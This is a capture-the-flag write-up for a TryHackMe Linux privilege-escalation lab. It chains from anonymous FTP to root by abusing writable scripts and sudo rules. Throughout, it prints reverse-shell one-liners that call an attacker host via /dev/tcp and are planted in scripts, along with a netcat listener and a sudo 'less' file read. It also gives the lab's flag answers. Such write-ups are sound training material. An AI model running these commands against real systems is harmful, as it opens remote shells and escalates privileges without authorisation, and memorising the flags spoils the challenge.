
CTF from the Jr Penetration Tester path on TryHackMe.
Description: *You’ve discovered a misconfigured internal automation pipeline running on a Linux server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.*
*Your objective is to escalate from anonymous access all the way through:

`recon_user → dev_user → monitor_user → ops_user → root`*

There are 5 flags to catch in this challenge, so let's begin!

First thing first, that means nmap scan.
`nmap -A -v -T4 -p- MACHINE_IP`

Results:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.112.96.255
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming [NSE: writeable]
|_drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6a:ee:48:07:ad:4a:8f:1f:57:c3:c8:88:61:4f:3d:21 (ECDSA)
|_  256 db:99:89:66:82:16:4d:f5:e9:c0:f9:04:35:bd:f5:78 (ED25519)
```

Two ports open, FTP on 21 - with anonymous login enabled, and SSH on 22.
After logging in as an `anonymous` to the FTP, there are two directories - *incoming* and *pub*. The *incoming* directory is empty, but in the *pub* there are directories and a file. 
The *README.txt* file tells me that "All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored."
So, put a file named *shell.sh* into *incoming* directory with `sh -i >& /dev/tcp/ATTACKER_IP/1337 0>&1` contents. I also set up a listener on attack box with `nc -lvnp 1337` and I got reverse shell to `recon_user`.
I navigated to `recon_user` home directory and I got first flag:
**THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}**

Now I need to escalate my privileges to `dev_user`.
I upgraded my shell with python: `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

For further enumeration I used `pspy`.
I set up python http server on my attack box where `pspy64` was, I used `wget` in pwnd earlier `recon_user` home dir, and lastly I used `chmod +x pspy64` to execute it.
I found interesting process which uses `/opt/dev/backup.sh` script.
I went into `/dev/opt` directory and used `ls -la` command, I discovered that the `recon_user` has write permissions on `backup.sh` script, which belongs to `dev_user`. It is a way to escalate my privileges.

I added the same `sh` rev shell command as before, but with different port number to the end of the `backup.sh` file.
`echo "sh -i >& /dev/tcp/10.112.96.255/2337 0>&1" >> backup.sh`
And I waited for a connection on `nc` listener.
After a few seconds I got shell as a `dev_user`.
The flag in the `/home/dev_user` directory:
**THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}**

I went back to running `pspy64` as a `dev_user` and I found out a process `/usr/local/bin/healthcheck`.
This process runs commands:
```
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```
and it's owned by `monitor_user`.
I checked `healthcheck` process further with `cat /etc/systemd/system/healthcheck.service` command, and it's env path points to `/opt/dev/bin`. I found a `ps` file in there which contains a reverse shell. I have write permission to this file, so I added a line at the end of this file with my own reverse shell:
`echo "setsid bash -i >& /dev/tcp/ATTACKER_IP/3337 0>&1" >> ps`. And changed permissions of a file to executable with `chmod a+x ps`. 

I got a shell as a `monitor_user`.
The third flag in `/home/monitor_user`:
**THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}**

The `monitor_user` can use `sudo -l`, which tells that the user can run `/usr/local/bin/deploy.sh` with sudo permissions.
I can't alter `deploy.sh` script, but after inspecting it's contents, it points out to `deploy_helper.sh` which is in the `/opt/app` directory and what is most important - can be altered.
So, I used a reverse shell command as before: `echo "setsid bash -i >& /dev/tcp/ATTACKER_IP/4337 0>&1" >> deploy_helper.sh`, and I ran `deploy.sh` with sudo as a `ops_user`.
`sudo -u ops_user /usr/local/bin/deploy.sh`

And I gained a shell as a `ops_user`.
The flag in the `/home/ops_user`:
**THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}**

Now, it's time for the root.
After running `sudo -l` there is a `/usr/bin/less` binary that allows me to run it with sudo.
I went to gtfobins to check it out.
I found out that I can read files that belongs to root with `less` binary with a command: `sudo -u root /usr/bin/less /root/flag.txt`.
The final flag:
**THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}**

